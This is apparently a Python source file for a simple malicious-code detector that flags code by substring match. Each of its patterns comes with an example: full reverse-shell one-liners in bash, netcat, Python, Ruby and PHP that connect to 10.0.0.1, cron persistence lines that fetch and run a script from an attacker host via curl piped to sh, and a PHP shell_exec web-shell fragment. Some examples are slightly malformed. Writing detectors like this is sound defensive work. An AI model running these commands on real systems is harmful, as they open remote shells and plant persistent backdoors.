from collections import namedtuple
from dataclasses import dataclass
from typing import Optional, Tuple, NamedTuple


@dataclass
class MaliciousPattern:
    pattern: str
    example: str


class MaliciousCodeDetectResult(NamedTuple):
    code: str
    detect_pattern: MaliciousPattern


@dataclass
class MaliciousCodeDetector:

    malicious_pattern = [
        MaliciousPattern("bash -i", "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"),
        MaliciousPattern("/dev/tcp/", "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"),
        MaliciousPattern("/bin/sh", "nc -e /bin/sh 10.0.0.1 1234"),
        MaliciousPattern("/bin/bash", "nc -e /bin/sh 10.0.0.1 1234"),
        MaliciousPattern("nc -e", "nc -e /bin/sh 10.0.0.1 1234"),
        MaliciousPattern(
            "import socket",
            "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        ),
        MaliciousPattern(
            "subprocess.call",
            "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        ),
        MaliciousPattern(
            "TCPSocket.open",
            "ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        ),
        MaliciousPattern("fsockopen", "php -r \$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
        MaliciousPattern(".exec(", "php -r \$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
        MaliciousPattern("/etc/crontab", "(crontab -l) \nn10 * * * * curl http://<ATTACKER_IP>/run | sh'"),
        MaliciousPattern("crontab", "10 * * * * curl http://<ATTACKER_IP>/run | sh | crontab -"),
        MaliciousPattern("/etc/cron*", "10 * * * * curl http://<ATTACKER_IP>/run | sh | crontab -"),
        MaliciousPattern("/etc/at*", "10 * * * * curl http://<ATTACKER_IP>/run | sh | crontab -"),
        MaliciousPattern("/var/spool/cron/crontabs/roo", "10 * * * * curl http://<ATTACKER_IP>/run | sh | crontab -"),
        MaliciousPattern("/etc/anacrontab", "10 * * * * curl http://<ATTACKER_IP>/run | sh | crontab -"),
        MaliciousPattern(".bashrc", "echo '{maliciou code}' > .bashrc"),
        MaliciousPattern("shell_exec", "shell_exec(\$_SERVER['CMD'])"),
        MaliciousPattern("popen2e", "socket = TCPSocket.new \"#{RHOST}\", \"#{PORT}\"  ... while line = sock.gets ... Open3.popen2e(\"#{line}\") do | stdin, stdout_and_stderr ... ")
    ]

    def detect_malicious_code(self, code: str) -> Optional[MaliciousCodeDetectResult]:
        for mp in self.malicious_pattern:
            if code.find(mp.pattern) != -1:
                return MaliciousCodeDetectResult(code, mp)
        return None

    def find_malicious_code_from_binary(self):
        # TODO
        pass
